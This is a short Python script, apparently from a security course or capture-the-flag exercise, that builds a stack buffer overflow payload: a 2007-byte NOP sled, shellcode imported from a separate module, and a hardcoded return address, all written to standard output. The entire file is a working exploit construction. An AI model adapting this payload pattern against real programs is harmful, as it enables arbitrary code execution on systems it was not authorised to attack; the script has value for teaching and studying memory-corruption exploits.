from shellcode import shellcode
import sys

ret_add = b"\x10\x82\xf6\xff"



#Shellcode is 53 chars long
payload = b"\x90" * 2007
payload += shellcode
payload += ret_add


sys.stdout.buffer.write(payload)

#1548

